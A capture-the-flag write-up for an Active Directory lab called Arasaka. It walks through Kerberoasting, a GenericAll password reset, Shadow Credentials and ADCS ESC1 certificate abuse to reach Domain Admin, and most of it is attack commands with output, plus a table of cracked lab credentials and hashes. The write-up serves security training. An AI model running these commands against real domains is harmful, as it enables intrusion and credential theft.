---
title: "Challenge Lab: Arasaka (Easy) - Arasaka"
author: Glueyy
date: 2026-06-15
description: Concise/clean writeup of my solving for Arasaka Machine on hack smarter
---

## Objective and Scope

You are a member of the Hack Smarter Red Team. This penetration test will operate under an assumed breach scenario, starting with valid credentials for a standard domain user, faraday.

The primary goal is to simulate a realistic attack, identifying and exploiting vulnerabilities to escalate privileges from a standard user to a Domain Administrator.

---

## Initial Creds

```
faraday:hacksmarter123
```

---

## Recon Findings

First grab the domain name and add it to `/etc/hosts`:

```
nxc smb 10.0.30.225
SMB  10.0.30.225  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)

sudo nano /etc/hosts

ping hacksmarter.local
PING hacksmarter.local (10.0.30.225) 56(84) bytes of data.
64 bytes from hacksmarter.local (10.0.30.225): icmp_seq=1 ttl=126 time=87.0 ms
64 bytes from hacksmarter.local (10.0.30.225): icmp_seq=2 ttl=126 time=103 ms
```

---

## Kerberoasting alt.svc

Used BloodHound to find a Kerberoastable account called `alt.svc`, then used Impacket to grab the hash:

```
impacket-GetUserSPNs 'hacksmarter.local'/'faraday':'hacksmarter123' -dc-ip 10.0.30.225 -request

ServicePrincipalName            Name     MemberOf  PasswordLastSet             LastLogon  Delegation
------------------------------  -------  --------  --------------------------  ---------  ----------
AI/blackwall.hacksmarter.local  alt.svc            2025-09-21 11:07:42.894050  <never>
```

Then cracked the hash with Hashcat:

```
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

Status...........: Cracked
```

**Cracked password:** `alt.svc:babygirl1`

---

## GenericAll - Resetting yorinobu's Password

BloodHound showed that `alt.svc` has GenericAll over `yorinobu`, so we can just reset their password:

```
net rpc password "yorinobu" "P@ssw0rd" -U "hacksmarter.local"/"alt.svc"%"babygirl1" -S "10.0.30.225"
```

Confirmed it worked:

```
nxc smb 10.0.30.225 -u yorinobu -p P@ssw0rd

SMB  10.0.30.225  445  DC01  [+] hacksmarter.local\yorinobu:P@ssw0rd
```

**New creds:** `yorinobu:P@ssw0rd`

---

## Shadow Credentials - Owning soulkiller.svc

BloodHound showed `yorinobu` has GenericWrite against `soulkiller.svc`, which lets us use pywhisker to do a Shadow Credentials attack:

```
pywhisker -d "hacksmarter.local" -u "yorinobu" -p "P@ssw0rd" --target "soulkiller.svc" --action "add"

[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: J8EdZSHD.pfx
[*] Must be used with password: oUFC0cN9QKafxhD7DlOc
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Then used Certipy to authenticate with the PFX and get the NT hash:

```
certipy-ad auth -pfx J8EdZSHD.pfx -password 'oUFC0cN9QKafxhD7DlOc' -domain hacksmarter.local -username soulkiller.svc -dc-ip 10.0.30.225

[*] Got TGT
[*] Wrote credential cache to 'soulkiller.svc.ccache'
[*] Got hash for 'soulkiller.svc@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a
```

We essentially own this account now.

---

## ADCS Enumeration - Finding ESC1

The BloodHound description for `soulkiller.svc` said _"Certificate management for soulkiller AI"_, so I ran Certipy as this account to look for certificate misconfigs:

```
certipy-ad find -u soulkiller.svc@hacksmarter.local -k -no-pass -target DC01.hacksmarter.local -dc-ip 10.0.30.225 -vulnerable -hashes aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a
```

The results revealed a lot. The important bits from the output:

```
Template Name                       : AI_Takeover
Certificate Authorities             : hacksmarter-DC01-CA
Enrollee Supplies Subject           : True
Extended Key Usage                  : Client Authentication
Enrollment Rights                   : HACKSMARTER.LOCAL\Soulkiller.svc

[!] Vulnerabilities
    ESC1                            : Enrollee supplies subject and template allows client authentication.
```

ESC1 is vulnerable because the template lets us specify who the cert is for (Enrollee Supplies Subject) and it allows Client Authentication - meaning we can request a cert as any user, including Domain Admins.

---

## ESC1 Exploitation - Getting Domain Admin

Requested a certificate as `administrator`:

```
certipy-ad req -u soulkiller.svc@hacksmarter.local -hashes aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn administrator@hacksmarter.local -dc-ip 10.0.30.225

[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@hacksmarter.local'
[*] Wrote certificate and private key to 'administrator.pfx'
```

But authenticating as `administrator` I hit a wall with it being an expired password:

```
certipy-ad auth -pfx administrator.pfx -domain hacksmarter.local -dc-ip 10.0.30.225

[-] Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)
```

So I tried a different admin account I have seen before in bloodhound `the_emperor`. Same method, requested a cert with their UPN, and this time it worked:

```
certipy-ad auth -pfx the_emperor.pfx -domain hacksmarter.local -dc-ip 10.0.30.225

[*] Got TGT
[*] Got hash for 'the_emperor@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133
```

---

## Shell on the DC

Used Evil-WinRM to get a shell with the hash:

```
evil-winrm -i dc01.hacksmarter.local -u the_emperor -H d87640b0d83dc7f90f5f30bd6789b133

*Evil-WinRM* PS C:\Users\the_emperor\Documents>
```

Confirmed Domain Admin:

```
*Evil-WinRM* PS C:\Users\the_emperor\Documents> net user the_emperor

Global Group memberships     *Domain Users         *Domain Admins
```

## Flag

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
fcf1dd0f08d1068a2f151fd2ec5ecf05
```

---

## Attack Chain

```
faraday (standard user)
  → Kerberoasting → alt.svc (babygirl1)
    → GenericAll → yorinobu (password reset)
      → GenericWrite → soulkiller.svc (Shadow Credentials → NT hash)
        → ADCS ESC1 (AI_Takeover template) → the_emperor cert
          → PKINIT auth → the_emperor NT hash → Domain Admin shell
```

---

Completion
https://www.hacksmarter.org/completion/303a188282289198

## Creds Collected

| Account        | Type     | Value                                                             |
| -------------- | -------- | ----------------------------------------------------------------- |
| faraday        | Password | hacksmarter123                                                    |
| alt.svc        | Password | babygirl1                                                         |
| yorinobu       | Password | P@ssw0rd                                                          |
| soulkiller.svc | NT Hash  | aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a |
| the_emperor    | NT Hash  | aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133 |